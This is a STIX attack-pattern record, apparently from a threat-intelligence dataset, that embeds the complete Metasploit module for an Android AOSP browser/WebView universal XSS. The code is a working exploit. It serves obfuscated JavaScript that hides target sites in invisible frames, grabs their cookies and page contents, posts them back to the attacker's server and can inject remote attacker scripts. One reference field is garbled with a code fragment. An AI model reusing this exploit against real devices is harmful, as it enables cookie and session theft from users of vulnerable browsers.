{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--54e2b788-c3b7-4fec-8100-d90d1f5b5173",
    "created": "2024-08-14T16:31:28.367368Z",
    "modified": "2024-08-14T16:31:28.367372Z",
    "name": "Android Open Source Platform (AOSP) Browser UXSS",
    "description": " This module exploits a Universal Cross-Site Scripting (UXSS) vulnerability present in all versions of Android's open source stock browser before 4.4, and Android apps running on < 4.4 that embed the WebView component. If successful, an attacker can leverage this bug to scrape both cookie data and page contents from a vulnerable browser window. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/android_object_tag_webview_uxss.rb",
            "external_id": "android_object_tag_webview_uxss.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html"
        },
        {
            "source_name": "reference",
            "url": "https://android.googlesource.com/platform/external/webkit/+/109d59bf6fe4abfd001fc60ddd403f1046b117ef"
        },
        {
            "source_name": "reference",
            "url": "http://trac.webkit.org/changeset/96826/webkit"
        },
        {
            "source_name": "OptString.new(TARGET_URLS",
            "external_id": ""
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::JSObfu\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Android Open Source Platform (AOSP) Browser UXSS',\n      'Description'    => %q{\n        This module exploits a Universal Cross-Site Scripting (UXSS) vulnerability present in\n        all versions of Android's open source stock browser before 4.4, and Android apps running\n        on < 4.4 that embed the WebView component. If successful, an attacker can leverage this bug\n        to scrape both cookie data and page contents from a vulnerable browser window.\n\n        Target URLs that use X-Frame-Options can not be exploited with this vulnerability.\n\n        Some sample UXSS scripts are provided in data/exploits/uxss.\n      },\n      'Author'         => [\n        'Rafay Baloch', # Original discovery, disclosure\n        'joev'          # Metasploit module\n      ],\n      'License'        => MSF_LICENSE,\n      'Actions'        => [\n        [ 'WebServer' ]\n      ],\n      'PassiveActions' => [\n        'WebServer'\n      ],\n      'References' => [\n        [ 'URL', 'http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html'],\n        [ 'URL', 'https://android.googlesource.com/platform/external/webkit/+/109d59bf6fe4abfd001fc60ddd403f1046b117ef' ],\n        [ 'URL', 'http://trac.webkit.org/changeset/96826/webkit' ]\n      ],\n      'DefaultAction'  => 'WebServer',\n      'DisclosureDate' => '2014-10-04'\n    ))\n\n    register_options([\n      OptString.new('TARGET_URLS', [\n        true,\n        \"The comma-separated list of URLs to steal.\",\n        'http://example.com'\n      ]),\n      OptString.new('CUSTOM_JS', [\n        false,\n        \"A string of javascript to execute in the context of the target URLs.\",\n        ''\n      ]),\n      OptString.new('REMOTE_JS', [\n        false,\n        \"A URL to inject into a script tag in the context of the target URLs.\",\n        ''\n      ])\n    ])\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Request '#{request.method} #{request.uri}'\")\n\n    if request.method.downcase == 'post'\n      collect_data(request)\n      send_response_html(cli, '')\n    else\n      payload_fn = Rex::Text.rand_text_alphanumeric(4+rand(8))\n      domains = datastore['TARGET_URLS'].split(',')\n\n      script = js_obfuscate <<-EOS\n        var targets = JSON.parse(atob(\"#{Rex::Text.encode_base64(JSON.generate(domains))}\"));\n        targets.forEach(function(target, i){\n          var obj = document.createElement('object');\n          obj.setAttribute('data', target);\n          obj.setAttribute('style', 'position:absolute;left:-9999px;top:-9999px;height:1px;width:1px');\n          obj.onload = function() {\n            obj.data = 'javascript:if(document&&document.body){(opener||top).postMessage('+\n              'JSON.stringify({cookie:document.cookie,url:location.href,body:document.body.innerH'+\n              'TML,i:'+(i||0)+'}),\"*\");eval(atob(\"#{Rex::Text.encode_base64(custom_js)}\"'+\n              '));}void(0);';\n            obj.innerHTML = '#{Rex::Text.rand_text_alphanumeric(rand(12)+5)}';\n          };\n          document.body.appendChild(obj);\n        });\n\n        window.addEventListener('message', function(e) {\n          var data = JSON.parse(e.data);\n          var x = new XMLHttpRequest;\n          x.open('POST', window.location, true);\n          x.send(e.data);\n        }, false);\n\n      EOS\n\n      html = <<-EOS\n        <html>\n          <body>\n            <script>\n              #{script}\n            </script>\n          </body>\n        </html>\n      EOS\n\n      print_status(\"Sending initial HTML ...\")\n      send_response_html(cli, html)\n    end\n  end\n\n  def collect_data(request)\n    begin\n      response = JSON.parse(request.body)\n    rescue JSON::ParserError\n      print_error \"Invalid JSON request.\"\n    else\n      url = response['url']\n      if response && url\n        file = store_loot(\"android.client\", \"text/plain\", cli.peerhost, request.body, \"aosp_uxss_#{url}\", \"Data pilfered from uxss\")\n        print_good \"Collected data from URL: #{url}\"\n        print_good \"Saved to: #{file}\"\n      end\n    end\n  end\n\n  def custom_js\n    rjs_hook + datastore['CUSTOM_JS']\n  end\n\n  def rjs_hook\n    remote_js = datastore['REMOTE_JS']\n    if remote_js.present?\n      \"var s = document.createElement('script');s.setAttribute('src', '#{remote_js}');document.body.appendChild(s); \"\n    else\n      ''\n    end\n  end\n\n  def run\n    exploit\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-10-04"
}